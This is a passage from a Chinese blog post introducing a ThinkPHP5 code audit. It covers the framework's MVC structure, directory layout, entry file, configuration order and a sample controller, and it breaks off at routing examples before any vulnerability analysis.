+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/06/15/du-web-gong-fang-you-gan/"><span class="title">读web攻防有感</span></a><a class="item title" href="/2024/06/29/xuan-ji-ying-ji-xiang-ying-ba-chang/"><span class="title">玄机应急响应靶场</span></a><a class="item title" href="/2024/06/17/thm-corp/"><span class="title">THM-Corp</span></a><a class="item title" href="/2024/06/16/thm-hacking-with-powershell/"><span class="title">THM-Hacking_With_PowerShell</span></a><a class="item title" href="/2024/06/10/thm-exploiting-active-directory/"><span class="title">THM-Exploiting Active Directory</span></a><a class="item title" href="/2024/06/11/thinkphp5-dai-shen/"><span class="title">ThinkPHP5代码审计</span></a><a class="item title" href="/2024/06/01/seacms-dai-ma-shen-ji/"><span class="title">SeaCMS代码审计</span></a><a class="item title" href="/2024/06/09/thm-enumerating-active-directory/"><span class="title">THM-Enumerating Active Directory</span></a><a class="item title" href="/2024/02/19/thm-persisting-active-directory/"><span class="title">THM-Persisting Active Directory</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-06-11T05:55:06.000Z">2024-06-11</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-06-14T16:10:27.897Z">2024-06-15</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>ThinkPHP5代码审计</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="0x01-前言">0x01 前言</h1>
+<p>本文初识TP框架，主要还是做一个了解，因为代审功底垃圾，因此本文可能质量低下，可能会是大部分的搬运，主要还是跟着文章去审计。</p>
+<p>ThinkPHP 是国内著名的 php开发框架，基于MVC模式，最早诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP。</p>
+<p>ThinkPHP5.0版本是一个颠覆和重构版本，采用全新的架构思想，引入了更多的PHP新特性，优化了核心，减少了依赖，实现了真正的惰性加载，支持composer，并针对API开发做了大量的优化，包括路由、日志、异常、模型、数据库、模板引擎和验证等模块都已经重构。</p>
+<p>ThinkPHP操作手册：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5">https://www.kancloud.cn/manual/thinkphp5</a> —— 完全开发手册</p>
+<p>目前，仍然有非常多网站以ThinkPHP5为框架开发。本文我们的目的是熟悉TP5框架，分析与复现历史漏洞，这里我们选择的版本是ThinkPHP5.0.10完整版。</p>
+<blockquote>
+<p>ThinkPHP5的运行环境要求PHP5.4以上。</p>
+</blockquote>
+<h1 id="0x02-thinkphp5基础">0x02 ThinkPHP5基础</h1>
+<h2 id="mvc模式流程">MVC模式流程</h2>
+<p>通常一个基于TP开发的CMS，可能有很多个模块，而每个模块都是控制器—模型—视图完整的。控制器根据要求选择调用模型，模型进行业务逻辑处理，交给视图渲染。这个流程。</p>
+<blockquote>
+<p>一个模块下面有多个<code>控制器</code>负责响应请求，而每个<code>控制器</code>其实就是一个独立的<code>控制器类</code>。<code>控制器</code>主要负责请求的接收，并调用相关的<code>模型</code>处理，并最终通过<code>视图</code>输出。严格来说，<code>控制器</code>不应该过多的介入业务逻辑处理。</p>
+<p><code>模型类</code>通常完成实际的业务逻辑和数据封装，并返回和格式无关的<code>数据</code>。</p>
+<p>控制器调用模型类后返回的<code>数据</code>通过<code>视图</code>组装成不同格式的输出。<code>视图</code>根据不同的需求，来决定调用<code>模板引擎</code>进行内容解析后输出还是直接输出。</p>
+</blockquote>
+<p>TP程序的开始</p>
+<blockquote>
+<p>PHP &gt;=5.3.0， PHP7</p>
+<p><code>ThinkPHP5.0</code>应用基于<code>MVC</code>（模型-视图-控制器）的方式来组织。</p>
+<p>MVC是一个设计模式，它强制性的使应用程序的输入、处理和输出分开。使用MVC应用程序被分成三个核心部件：模型（M）、视图（V）、控制器（C），它们各自处理自己的任务。</p>
+<p>5.0的URL访问受路由决定，如果关闭路由或者没有匹配路由的情况下，则是基于：<code>http://serverName/index.php/模块/控制器/操作/参数/值…</code></p>
+</blockquote>
+<h2 id="目录结构">目录结构</h2>
+<h3 id="初始目录结构">初始目录结构</h3>
+<p>application目录是这个应用的目录，index目录是这个应用的一个模块，其内的controller目录存放的是这个模块的控制器，同理一般model目录就存放的模型，view目录就放的视图。</p>
+<p>www WEB部署目录（或者子目录）</p>
+<pre><code class="hljs scss">├─application 应用目录
+
+│ ├─common 公共模块目录（可以更改）
+
+│ ├─module_name 模块目录
+
+│ │ ├─config<span class="hljs-selector-class">.php</span> 模块配置文件
+
+│ │ ├─common<span class="hljs-selector-class">.php</span> 模块函数文件
+
+│ │ ├─controller 控制器目录
+
+│ │ ├─model 模型目录
+
+│ │ ├─view 视图目录
+
+│ │ └─ ... 更多类库目录
+
+│ │
+
+│ ├─command<span class="hljs-selector-class">.php</span> 命令行工具配置文件
+
+│ ├─common<span class="hljs-selector-class">.php</span> 公共函数文件
+
+│ ├─config<span class="hljs-selector-class">.php</span> 公共配置文件
+
+│ ├─route<span class="hljs-selector-class">.php</span> 路由配置文件
+
+│ ├─tags<span class="hljs-selector-class">.php</span> 应用行为扩展定义文件
+
+│ └─database<span class="hljs-selector-class">.php</span> 数据库配置文件
+
+│
+
+├─public WEB目录（对外访问目录）
+
+│ ├─index<span class="hljs-selector-class">.php</span> 入口文件
+
+│ ├─router<span class="hljs-selector-class">.php</span> 快速测试文件
+
+│ └─<span class="hljs-selector-class">.htaccess</span> 用于apache的重写
+
+│
+
+├─thinkphp 框架系统目录
+
+│ ├─lang 语言文件目录
+
+│ ├─library 框架类库目录
+
+│ │ ├─think Think类库包目录
+
+│ │ └─traits 系统Trait目录
+
+│ │
+
+│ ├─tpl 系统模板目录
+
+│ ├─base<span class="hljs-selector-class">.php</span> 基础定义文件
+
+│ ├─console<span class="hljs-selector-class">.php</span> 控制台入口文件
+
+│ ├─convention<span class="hljs-selector-class">.php</span> 框架惯例配置文件
+
+│ ├─helper<span class="hljs-selector-class">.php</span> 助手函数文件
+
+│ ├─phpunit<span class="hljs-selector-class">.xml</span> phpunit配置文件
+
+│ └─start<span class="hljs-selector-class">.php</span> 框架入口文件
+
+│
+
+├─extend 扩展类库目录
+
+├─runtime 应用的运行时目录（可写，可定制）
+
+├─vendor 第三方类库目录（Composer依赖库）
+
+├─build<span class="hljs-selector-class">.php</span> 自动生成定义文件（参考）
+
+├─composer<span class="hljs-selector-class">.json</span> composer 定义文件
+
+├─LICENSE<span class="hljs-selector-class">.txt</span> 授权说明文件
+
+├─README<span class="hljs-selector-class">.md</span> README 文件
+
+├─think 命令行入口文件</code></pre>
+<h3 id="入口文件">入口文件</h3>
+<p><code>ThinkPHP5.0</code>版本的默认自带的入口文件位于<code>public/index.php</code>（<strong>实际部署的时候<code>public</code>目录为你的应用对外访问目录</strong>），入口文件内容如下：</p>
+<pre><code class="hljs php"><span class="hljs-comment">// 定义应用目录</span>
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'APP_PATH'</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/../application/'</span>);
+<span class="hljs-comment">// 加载框架引导文件</span>
+<span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/../thinkphp/start.php'</span>;</code></pre>
+<p>这段代码的作用就是定义应用目录<code>APP_PATH</code>和加载<code>ThinkPHP</code>框架的入口文件，这是所有基于<code>ThinkPHP</code>开发应用的第一步。</p>
+<p>官方提供的默认应用的实际目录结构和说明如下：</p>
+<pre><code class="hljs scss">├─application           应用目录（可设置）
+│  ├─index              模块目录(可更改)
+│  │  ├─config<span class="hljs-selector-class">.php</span>      模块配置文件
+│  │  ├─common<span class="hljs-selector-class">.php</span>      模块公共文件
+│  │  ├─controller      控制器目录
+│  │  ├─model           模型目录
+│  │  └─view            视图目录
+│  │
+│  ├─command<span class="hljs-selector-class">.php</span>        命令行工具配置文件
+│  ├─common<span class="hljs-selector-class">.php</span>         应用公共文件
+│  ├─config<span class="hljs-selector-class">.php</span>         应用配置文件
+│  ├─tags<span class="hljs-selector-class">.php</span>           应用行为扩展定义文件
+│  ├─database<span class="hljs-selector-class">.php</span>       数据库配置文件
+│  └─route<span class="hljs-selector-class">.php</span>          路由配置文件</code></pre>
+<p><code>5.0</code>版本采用模块化的设计架构，默认的应用目录下面只有一个<code>index</code>模块目录。</p>
+<h3 id="静态资源文件">静态资源文件</h3>
+<p>网站的资源文件一般放入<code>public</code>目录的子目录下面，例如</p>
+<pre><code class="hljs scss">public
+├─index<span class="hljs-selector-class">.php</span>       应用入口文件
+├─static				静态资源目录   
+│  ├─css      样式目录
+│  ├─js         脚本目录
+│  └─<span class="hljs-selector-tag">img</span>      图像目录</code></pre>
+<h3 id="调试模式">调试模式</h3>
+<p>应用配置文件（<code>application/config.php</code>）中的<code>app_debug</code>配置参数：</p>
+<pre><code class="hljs dart"><span class="hljs-comment">// 关闭调试模式</span>
+<span class="hljs-string">'app_debug'</span> =&gt;  <span class="hljs-keyword">false</span>,</code></pre>
+<h2 id="配置文件">配置文件</h2>
+<p>在ThinkPHP中，一般来说应用的配置文件是自动加载的，加载的顺序是：</p>
+<blockquote>
+<p><strong>惯例配置-&gt;应用配置-&gt;扩展配置-&gt;场景配置-&gt;模块配置-&gt;动态配置</strong></p>
+</blockquote>
+<p>以上是配置文件的加载顺序，因为后面的配置会覆盖之前的同名配置（在没有生效的前提下），所以配置的优先顺序从右到左。</p>
+<blockquote>
+<p>惯例配置：位于<code>thinkphp/convention.php</code></p>
+<p>应用配置：位于<code>application/config.php</code></p>
+<p>扩展配置：<code>V5.0.1</code>开始，取消了该配置参数，扩展配置文件直接放入<code>application/extra</code>目录会自动加载。</p>
+<p>场景配置：每个应用都可以在不同的情况下设置自己的状态（或者称之为应用场景），并且加载不同的配置文件。</p>
+<p>模块配置：位于<code>application/当前模块名/config.php</code></p>
+</blockquote>
+<h2 id="控制器">控制器</h2>
+<blockquote>
+<p>根据类的命名空间可以快速定位文件位置，在<code>ThinkPHP5.0</code>的规范里面，命名空间其实对应了文件的所在目录，<code>app</code>命名空间通常代表了文件的起始目录为<code>application</code>，而<code>think</code>命名空间则代表了文件的起始目录为<code>thinkphp/library/think</code>，后面的命名空间则表示从起始目录开始的子目录。</p>
+</blockquote>
+<p>举个例子：</p>
+<p>5.0的控制器类比较灵活，可以无需继承任何基础类库。控制器不应该过多的介入业务逻辑处理；一个典型的<code>Index</code>控制器类如下：控制器就是一个类，类里的不同的方法就是不同的操作</p>
+<pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Request</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> </span>
+<span class="hljs-class"></span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>{
+        <span class="hljs-keyword">return</span> <span class="hljs-string">'hello,thinkphp!'</span>;
+    }
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>{
+        <span class="hljs-variable">$name</span> = <span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">instance</span>()-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-string">'name'</span>);
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"My name is "</span> . <span class="hljs-variable">$name</span>;
+    }
+}</code></pre>
+<p>操作方法可以不使用任何参数，如果定义了一个非可选参数，则该参数必须通过用户请求传入，如果是URL请求，则通常是<code>$_GET</code>或者<code>$_POST</code>方式传入。</p>
+<ul>
+<li>如上代码第一行是确定了命名空间。什么是命名空间？</li>
+</ul>
+<blockquote>
+<p>在PHP中，命名空间用来解决在编写类库或应用程序时创建可重用的代码如类或函数时碰到的两类问题。</p>
+<ol>
+<li>用户编写的代码与PHP内部的类/函数/常量或第三方类/函数/常量之间的名字==冲突==</li>
+<li>为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。</li>
+</ol>
+</blockquote>
+<p>而TP5的思想是</p>
+<blockquote>
+<p><code>ThinkPHP5</code>采用命名空间方式定义和自动加载类库文件，有效的解决了多模块和<code>Composer</code>类库之间的命名空间冲突问题，并且实现了更加高效的类库自动加载机制。</p>
+</blockquote>
+<ul>
+<li>如上代码第二行use就是加载类库，调用TP5写好的Request类，其中实现了一些请求方法。（这里直接借用图片了）</li>
+</ul>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611163514856-1718094915107-1.png" alt="image-20240611163514856"></p>
+<p>相对应的就是上面代码11行的<code>Request::instance()-&gt;param('name');</code>即获取客户端传入的参数name</p>
+<p>我们找到<code>index</code>模块的<code>Index</code>控制器（文件位于<code>application/index/controller/Index.php</code> 注意大小写），我们把<code>Index</code>控制器类的<code>index</code>方法修改为<code>Hello,World！</code>。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611151019929.png" alt="image-20240611151019929"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611151517988.png" alt="image-20240611151517988"></p>
+<p>如果要访问一个驼峰命名的控制器，我们在index.php同目录下，添加一个HelloWorld的控制器。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611151959109.png" alt="image-20240611151959109"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611151651857.png" alt="image-20240611151651857"></p>
+<p>如果按照如下的路由访问，结果正确：<a target="_blank" rel="noopener" href="http://127.0.0.1/ThinkPHP5/public/index.php/index/hello_world">http://127.0.0.1/ThinkPHP5/public/index.php/index/hello_world</a></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611151923550.png" alt="image-20240611151923550"></p>
+<p>但如果这样访问：<a target="_blank" rel="noopener" href="http://127.0.0.1/ThinkPHP5/public/index.php/index/HelloWorld">http://127.0.0.1/ThinkPHP5/public/index.php/index/HelloWorld</a></p>
